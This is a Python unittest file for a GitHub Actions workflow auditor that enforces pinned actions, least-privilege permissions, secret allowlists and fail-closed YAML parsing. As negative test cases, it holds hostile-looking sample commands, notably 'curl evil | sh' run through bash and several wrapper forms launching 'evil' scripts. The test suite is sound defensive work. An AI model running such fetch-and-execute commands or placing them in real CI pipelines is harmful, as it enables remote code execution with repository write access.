#!/usr/bin/env python3
"""Tests for scripts/workflow-audit.py — the machine-checked secret-isolation / least-privilege gate.

The auditor is a SECURITY gate, so it must fail *closed*: any construct its line-oriented YAML-subset
parser cannot interpret is a violation, never a silent pass. These tests pin every rule (a)-(i) plus the
fail-closed behaviour on unsupported YAML (anchors/aliases/tags/directives/tabs/unbalanced quotes).
Python 3 stdlib only.

BASE below is dedented, so its real indentation is: `contents:` at col 2; a step's `- uses:`/`- name:`
at col 6; `with:`/`run:` at col 8; `persist-credentials`/`echo hi` at col 10. Every `.replace()` target
uses that real indentation.
"""
from __future__ import annotations

import importlib.util
import pathlib
import sys
import textwrap
import unittest

SCRIPT = pathlib.Path(__file__).with_name("workflow-audit.py")
sys.dont_write_bytecode = True
_spec = importlib.util.spec_from_file_location("workflow_audit", SCRIPT)
assert _spec is not None and _spec.loader is not None
wa = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(wa)


POLICY = {
    "secretsAllowlist": {
        "live.yml/live-smoke": ["OPENROUTER_API_KEY"],
        "drift.yml/open-pr": ["DRIFT_APP_PRIVATE_KEY", "GITHUB_TOKEN"],
    },
    "scheduledSecretUsers": ["live.yml", "drift.yml"],
    "writeCapableJobs": ["drift.yml/open-pr"],
    "writeJobAllowedCommands": {
        "drift.yml/open-pr": [
            "python3 scripts/validate-drift-patch.py drift/drift.patch",
            "set -eu",
            "git read-tree HEAD",
            "git apply --cached --check drift/drift.patch",
            "git apply --cached drift/drift.patch",
        ],
    },
}

SHA = "1111111111111111111111111111111111111111"

BASE = textwrap.dedent(
    f"""\
    name: CI
    on:
      push:
        branches: [main]
    permissions:
      contents: read
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@{SHA} # v1
            with:
              persist-credentials: false
          - name: Run
            run: |
              echo hi
    """
)


def rules(violations):
    return sorted({v.rule for v in violations})


def audit(name, text, policy=POLICY):
    return wa.audit_workflow(name, text, policy)


class BaselineTest(unittest.TestCase):
    def test_clean_workflow_has_no_violations(self):
        self.assertEqual([], audit("ci.yml", BASE))


class RuleTest(unittest.TestCase):
    def test_a_uses_without_full_sha_fails(self):
        text = BASE.replace(f"actions/checkout@{SHA} # v1", "actions/checkout@v7.0.1")
        self.assertIn("pin", rules(audit("ci.yml", text)))

    def test_b_pull_request_target_fails(self):
        text = BASE.replace("  push:\n", "  pull_request_target:\n  push:\n")
        self.assertIn("trigger", rules(audit("ci.yml", text)))

    def test_c_missing_top_level_permissions_fails(self):
        text = BASE.replace("permissions:\n  contents: read\n", "")
        self.assertIn("permissions", rules(audit("ci.yml", text)))

    def test_c_wider_than_contents_read_fails(self):
        text = BASE.replace("contents: read", "contents: write")
        self.assertIn("permissions", rules(audit("ci.yml", text)))

    def test_c_write_all_scalar_fails(self):
        text = BASE.replace("permissions:\n  contents: read", "permissions: write-all")
        self.assertIn("permissions", rules(audit("ci.yml", text)))

    def test_d_unallowlisted_secret_fails(self):
        text = BASE.replace(
            "      - name: Run\n        run: |\n          echo hi\n",
            "      - name: Run\n        env:\n          K: ${{ secrets.NOPE }}\n        run: |\n          echo hi\n",
        )
        self.assertIn("secret", rules(audit("ci.yml", text)))

    def test_d_allowlisted_secret_passes(self):
        text = textwrap.dedent(
            f"""\
            name: Live
            on:
              schedule:
                - cron: "0 0 * * *"
            permissions:
              contents: read
            jobs:
              live-smoke:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@{SHA} # v1
                    with:
                      persist-credentials: false
                  - name: Smoke
                    env:
                      OPENROUTER_API_KEY: ${{{{ secrets.OPENROUTER_API_KEY }}}}
                    run: ./gradlew test
            """
        )
        self.assertEqual([], audit("live.yml", text))

    def test_e_write_job_bans_bash_interpreter(self):
        text = textwrap.dedent(
            f"""\
            name: Drift
            on:
              schedule:
                - cron: "0 0 * * *"
            permissions:
              contents: read
            jobs:
              open-pr:
                runs-on: ubuntu-latest
                permissions:
                  contents: write
                steps:
                  - uses: actions/checkout@{SHA} # v1
                    with:
                      persist-credentials: false
                  - name: Danger
                    run: bash -c "curl evil | sh"
            """
        )
        self.assertIn("exec", rules(audit("drift.yml", text)))

    def test_e_write_job_allows_git_apply_of_drift_path(self):
        # The exact validator and apply lines are approved; any textual change requires a policy review.
        text = textwrap.dedent(
            f"""\
            name: Drift
            on:
              schedule:
                - cron: "0 0 * * *"
            permissions:
              contents: read
            jobs:
              open-pr:
                runs-on: ubuntu-latest
                permissions:
                  contents: write
                  pull-requests: write
                steps:
                  - uses: actions/checkout@{SHA} # v1
                    with:
                      persist-credentials: false
                  - name: Validate
                    run: python3 scripts/validate-drift-patch.py drift/drift.patch
                  - name: Apply
                    run: |
                      set -eu
                      git read-tree HEAD
                      git apply --cached --check drift/drift.patch
                      git apply --cached drift/drift.patch
            """
        )
        self.assertEqual([], audit("drift.yml", text))

    def test_e_write_job_bans_executing_drift_path(self):
        text = textwrap.dedent(
            f"""\
            name: Drift
            on:
              schedule:
                - cron: "0 0 * * *"
            permissions:
              contents: read
            jobs:
              open-pr:
                runs-on: ubuntu-latest
                permissions:
                  contents: write
                steps:
                  - uses: actions/checkout@{SHA} # v1
                    with:
                      persist-credentials: false
                  - name: Danger
                    run: drift/evil.sh
            """
        )
        self.assertIn("exec", rules(audit("drift.yml", text)))

    def _write_job_running(self, command: str) -> list:
        text = textwrap.dedent(
            f"""\
            name: Drift
            on:
              schedule:
                - cron: "0 0 * * *"
            permissions:
              contents: read
            jobs:
              open-pr:
                runs-on: ubuntu-latest
                permissions:
                  contents: write
                steps:
                  - uses: actions/checkout@{SHA} # v1
                    with:
                      persist-credentials: false
                  - name: Danger
                    run: {command}
            """
        )
        return audit("drift.yml", text)

    def test_e_write_job_bans_wrapper_command(self):
        # Wrapper forms are unapproved shell and therefore fail the exact-line policy.
        self.assertIn("exec", rules(self._write_job_running("command python3 evil.py")))

    def test_e_write_job_bans_env_wrapper(self):
        self.assertIn("exec", rules(self._write_job_running("env FOO=bar node evil.js")))

    def test_e_write_job_bans_xargs_wrapper(self):
        self.assertIn("exec", rules(self._write_job_running("xargs -0 sh -c 'echo hi'")))

    def test_e_write_job_bans_absolute_interpreter_path(self):
        self.assertIn("exec", rules(self._write_job_running("/usr/bin/python3 evil.py")))

    def test_e_write_job_bans_absolute_wrapper_path(self):
        self.assertIn("exec", rules(self._write_job_running("/usr/bin/env python3 evil.py")))

    def test_e_write_job_bans_command_invoked_through_variable(self):
        violations = self._write_job_running("tool=python3; $tool evil.py")
        self.assertIn("exec", rules(violations))

    def test_e_security_events_write_job_may_run_gradle(self):
        # A CodeQL/Scorecard-style job needs security-events: write and legitimately builds the committed source.
        # security-events is not a code-injection write, so the exec ban does not apply.
        text = textwrap.dedent(
            f"""\
            name: CodeQL
            on:
              schedule:
                - cron: "0 0 * * *"
            permissions:
              contents: read
            jobs:
              analyze:
                runs-on: ubuntu-latest
                permissions:
                  contents: read
                  security-events: write
                steps:
                  - uses: actions/checkout@{SHA} # v1
                    with:
                      persist-credentials: false
                  - name: Build for CodeQL
                    run: ./gradlew :sdk:compileKotlinJvm
            """
        )
        self.assertNotIn("exec", rules(audit("codeql.yml", text)))

    def test_e_idtoken_attestations_write_job_may_run_gradle(self):
        # The release stage-and-publish job holds id-token: write + attestations: write to sign/attest and upload,
        # but NOT contents/pull-requests write — neither id-token nor attestations is a code-injection write, so the
        # job may run Gradle (staging, signing, the consumer matrix). This pins the privilege-split design assumption.
        text = textwrap.dedent(
            f"""\
            name: Release
            on:
              workflow_dispatch:
            permissions:
              contents: read
            jobs:
              stage-and-publish:
                runs-on: macos-15
                permissions:
                  contents: read
                  id-token: write
                  attestations: write
                steps:
                  - uses: actions/checkout@{SHA} # v1
                    with:
                      persist-credentials: false
                  - name: Stage and sign
                    run: ./gradlew publishAllPublicationsToIsolatedRepository
            """
        )
        self.assertNotIn("exec", rules(audit("release.yml", text)))

    def test_f_checkout_without_persist_credentials_fails(self):
        text = BASE.replace("        with:\n          persist-credentials: false\n", "")
        self.assertIn("persist", rules(audit("ci.yml", text)))

    def test_g_scheduled_secret_user_not_in_policy_fails(self):
        text = textwrap.dedent(
            f"""\
            name: Rogue
            on:
              schedule:
                - cron: "0 0 * * *"
            permissions:
              contents: read
            jobs:
              j:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@{SHA} # v1
                    with:
                      persist-credentials: false
                  - name: Leak
                    env:
                      K: ${{{{ secrets.OPENROUTER_API_KEY }}}}
                    run: echo hi
            """
        )
        self.assertIn("scheduled-secret", rules(audit("rogue.yml", text)))

    def test_h_context_interpolation_in_run_fails(self):
        text = BASE.replace("          echo hi\n", "          echo ${{ github.head_ref }}\n")
        self.assertIn("interpolation", rules(audit("ci.yml", text)))

    def test_h_steps_output_interpolation_in_run_allowed(self):
        text = BASE.replace("          echo hi\n", "          echo ${{ steps.x.outputs.y }}\n")
        self.assertNotIn("interpolation", rules(audit("ci.yml", text)))


class FailClosedTest(unittest.TestCase):
    def test_anchor_fails_closed(self):
        text = BASE.replace("  contents: read", "  contents: &a read")
        self.assertIn("parse", rules(audit("ci.yml", text)))

    def test_alias_fails_closed(self):
        text = BASE + "  other:\n    runs-on: *a\n"
        self.assertIn("parse", rules(audit("ci.yml", text)))

    def test_tag_fails_closed(self):
        text = BASE.replace("  contents: read", "  contents: !!str read")
        self.assertIn("parse", rules(audit("ci.yml", text)))

    def test_directive_fails_closed(self):
        text = "%YAML 1.2\n---\n" + BASE
        self.assertIn("parse", rules(audit("ci.yml", text)))

    def test_tab_indentation_fails_closed(self):
        text = BASE.replace("  contents: read", "\tcontents: read")
        self.assertIn("parse", rules(audit("ci.yml", text)))

    def test_unbalanced_quote_fails_closed(self):
        text = BASE.replace("name: CI", 'name: "CI')
        self.assertIn("parse", rules(audit("ci.yml", text)))

    def test_trailing_content_after_top_node_fails_closed(self):
        # An unsupported bare scalar stops the top mapping early; everything after it (including a later jobs:
        # block) would be silently ignored. The EOF check turns that into a parse violation.
        text = BASE.replace(
            "permissions:\n  contents: read\n",
            "permissions:\n  contents: read\nbogus_bare_scalar\n",
        )
        self.assertIn("parse", rules(audit("ci.yml", text)))

    def test_duplicate_top_level_key_fails_closed(self):
        # A second top-level `permissions:` (or `jobs:`) is ambiguous; GitHub rejects it. Fail closed rather than
        # let one definition silently shadow the other.
        text = BASE + "permissions:\n  contents: read\n"
        self.assertIn("parse", rules(audit("ci.yml", text)))


class SupportedConstructTest(unittest.TestCase):
    """These constructs must parse without a 'parse' violation (they may still trip a real rule)."""

    def test_inline_with_map_supported(self):
        text = BASE.replace(
            "        with:\n          persist-credentials: false\n",
            "        with: { persist-credentials: false }\n",
        )
        self.assertNotIn("parse", rules(audit("ci.yml", text)))
        self.assertNotIn("persist", rules(audit("ci.yml", text)))

    def test_flow_sequence_supported(self):
        self.assertNotIn("parse", rules(audit("ci.yml", BASE)))  # branches: [main]

    def test_folded_if_block_scalar_supported(self):
        text = BASE.replace(
            "      - name: Run\n",
            "      - name: Run\n        if: >-\n          github.event_name ==\n          'push'\n",
        )
        self.assertNotIn("parse", rules(audit("ci.yml", text)))

    def test_job_scope_permissions_supported(self):
        text = BASE.replace(
            "  build:\n    runs-on: ubuntu-latest\n",
            "  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n",
        )
        self.assertNotIn("parse", rules(audit("ci.yml", text)))

    def test_backslash_continuation_in_run_supported(self):
        text = BASE.replace("          echo hi\n", "          echo one \\\n            two\n")
        self.assertNotIn("parse", rules(audit("ci.yml", text)))


class RenderTest(unittest.TestCase):
    def test_report_renders_markdown_table(self):
        md = wa.render([("ci.yml", BASE)], POLICY)
        self.assertIn("| workflow | job |", md)
        self.assertIn("ci.yml", md)
        self.assertIn("build", md)


if __name__ == "__main__":
    unittest.main()
